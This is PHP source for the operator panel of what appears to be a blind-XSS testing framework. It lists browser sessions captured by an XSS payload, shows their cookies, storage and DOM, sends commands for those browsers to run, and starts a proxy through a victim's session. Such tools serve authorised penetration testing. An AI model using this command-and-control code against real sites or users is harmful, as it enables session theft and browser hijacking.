<?php

class Persistent extends Controller
{
    /**
     * Summary of rows
     * 
     * @var array
     */
    private $rows = ['id', 'uri', 'ip', 'referer', 'payload', 'user-agent', 'cookies', 'localstorage', 'sessionstorage', 'dom', 'origin', 'clientid', 'browser', 'last'];

    /**
     * Returns the session view for 0 (all).
     * 
     * @return string
     */
    public function all()
    {
        return $this->list(0);
    }

    /**
     * Renders the list of all sessions within payload and returns the content.
     * 
     * @param string $id The payload id
     * @return string
     */
    public function list($id)
    {
        $this->isLoggedInOrExit();
        $this->view->setTitle('Online');
        $this->view->renderTemplate('persistent/index');

        // Check payload permissions
        $payloadList = $this->payloadList();
        if (!is_numeric($id) || !in_array(+$id, $payloadList, true)) {
            throw new Exception('You dont have permissions to this payload');
        }

        // Retrieve and render all payloads of user for listing
        $payloads = [];
        foreach ($payloadList as $val) {
            $name = !$val ? 'All payloads' : $this->model('Payload')->getById($val)['payload'];
            $payloads[] = ['id' => $val, 'name' => ucfirst($name), 'selected' => $val == $id ? 'selected' : ''];
        }
        $this->view->renderDataset('payload', $payloads);

        return $this->showContent();
    }

    /**
     * Renders the session view and returns the content.
     * 
     * @param string $clientId The client id
     * @throws Exception
     * @return string
     */
    public function session($clientId)
    {
        $this->isLoggedInOrExit();
        $this->view->setTitle('Online');
        $this->view->renderTemplate('persistent/session');

        $clientId = explode('~', $clientId ?? '');
        $origin = $clientId[1] ?? '';
        $clientId = $clientId[0] ?? '';

        if (!$this->hasSessionPermissions($clientId, $origin)) {
            throw new Exception('You dont have permissions to this session');
        }

        $session = $this->model('Session')->getByClientId($clientId, $origin);

        if ($this->isPOST()) {
            try {
                $this->validateCsrfToken();

                $this->view->setContentType('application/json');

                // Check if posted data is deleting session
                if ($this->getPostValue('delete') !== null) {
                    $this->model('Session')->deleteAll($clientId, $origin);
                    redirect('/manage/persistent/all');
                }

                // Check if posted data is killing persistent
                if ($this->getPostValue('kill') !== null) {
                    $this->model('Console')->add($clientId, $origin, 'ez_stop()');
                    throw new Exception('Kill commando send to session');
                }

                // Check if posted data is executing command
                if ($this->getPostValue('execute') !== null) {
                    $command = $this->getPostValue('command');
                    $this->model('Console')->add($clientId, $origin, $command);
                    return json_encode(1);
                }

                // Check if posted data is getting console data
                if ($this->getPostValue('getconsole') !== null) {
                    $console = $this->model('Session')->getAllConsole($clientId, $origin);
                    return json_encode(['console' => $console]);
                }

                // Check if posted data is starting proxy
                if ($this->getPostValue('proxy') !== null) {
                    $ipport = $this->getPostValue('ipport');

                    if (!preg_match('/^([\w.-]+):\d+$/', $ipport)) {
                        throw new Exception('This does not look like a valid domain/IP with port');
                    }

                    $passOrigin = $this->getPostValue('passorigin') !== null ? '1' : '0';
                    $this->model('Console')->add($clientId, $origin, "ez_soc('$ipport', $passOrigin)");
                    throw new Exception("Proxy started on $ipport is accessible on http://$clientId.ezxss" . ($passOrigin === '1' ? " and http://$origin" : ''));
                }

            } catch (Exception $e) {
                $this->view->setContentType('text/html');
                $this->view->renderMessage($e->getMessage());
            }
        }

        // Render all rows
        $this->view->renderData('time', date('F j, Y, g:i a', $session['time']));
        $this->view->renderData('requests', $this->model('Session')->getRequestCount($clientId));

        $session['browser'] = $this->parseUserAgent($session['user-agent']);
        $session['last'] = $this->parseTimestamp($session['time'], 'long');

        $console = $this->model('Session')->getAllConsole($clientId, $origin);
        $this->view->renderData('console', $console);

        foreach ($this->rows as $value) {
            $this->view->renderData($value, $session[$value]);
        }

        return $this->showContent();

    }

    /**
     * Renders all the requests of a session.
     * 
     * @param string $clientId The client id
     * @throws Exception
     * @return string
     */
    public function requests($clientId)
    {
        $this->isLoggedInOrExit();
        $this->view->setTitle('Online');
        $this->view->renderTemplate('persistent/requests');

        $clientId = explode('~', $clientId ?? '');
        $origin = $clientId[1] ?? '';
        $clientId = $clientId[0] ?? '';

        if (!$this->hasSessionPermissions($clientId, $origin)) {
            throw new Exception('You dont have permissions to this session');
        }

        $requests = $this->model('Session')->getAllByClientId($clientId, $origin);

        foreach ($requests as $key => $value) {
            $requests[$key]['browser'] = $this->parseUserAgent($requests[$key]['user-agent']);
            $requests[$key]['last'] = $this->parseTimestamp($requests[$key]['time'], 'long');
            $requests[$key]['shorturi'] = substr($requests[$key]['uri'], 0, 50);
        }

        $this->view->renderCondition('hasRequests', count($requests) > 0);
        $this->view->renderDataset('request', $requests);

        return $this->showContent();
    }

    /**
     * Renders a request of a session.
     * 
     * @param string $id The request id
     * @throws Exception
     * @return string
     */
    public function request($id)
    {
        $this->isLoggedInOrExit();
        $this->view->setTitle('Online');
        $this->view->renderTemplate('persistent/request');

        $request = $this->model('Session')->getById($id);
        $clientId = $request['clientId'] ?? '';
        $origin = $request['origin'] ?? '';

        if (!$this->hasSessionPermissions($clientId, $origin)) {
            throw new Exception('You dont have permissions to this session');
        }

        $this->view->renderData('time', date('F j, Y, g:i a', $request['time']));

        foreach (array_slice($this->rows, 0, -2) as $value) {
            $this->view->renderData($value, $request[$value]);
        }

        return $this->showContent();
    }

    /**
     * Checks if user is allowed to view session
     * 
     * @param string $id The session id
     * @param string $id The session origin
     * @return bool
     */
    private function hasSessionPermissions($clientId, $origin)
    {
        if ($this->isAdmin()) {
            return true;
        }

        // Get data about report and payloads of user
        $session = $this->model('Session')->getByClientId($clientId, $origin);
        $user = $this->model('User')->getById($this->session->data('id'));
        $payloads = $this->model('Payload')->getAllByUserId($user['id']);

        // Check all payloads if it correspondents to session 
        foreach ($payloads as $payload) {
            if (strpos($payload['payload'], '/') === false) {
                // Check for domain
                $payload = '//' . $payload['payload'] . '/';
                if ($payload === $session['payload'] || substr($session['payload'], 0, strlen($payload)) === $payload) {
                    return true;
                }
            } else {
                // Check for domain + path
                if ('//' . $payload['payload'] === $session['payload']) {
                    return true;
                }
            }
        }

        return false;
    }
}